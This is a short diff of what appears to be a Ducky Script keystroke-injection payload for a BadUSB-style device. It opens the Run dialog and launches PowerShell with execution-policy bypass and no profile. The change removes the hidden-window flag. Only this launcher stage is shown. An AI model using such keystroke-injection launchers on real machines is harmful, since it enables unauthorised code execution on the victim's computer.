@@ -13,7 +13,7 @@ DEFAULT_DELAY 100
 REM open powershell (remove -W Hidden to show the window)
 GUI r
 DELAY 750
-STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+STRING powershell -NoP -NonI -Exec Bypass
 ENTER
 DELAY 4000
 
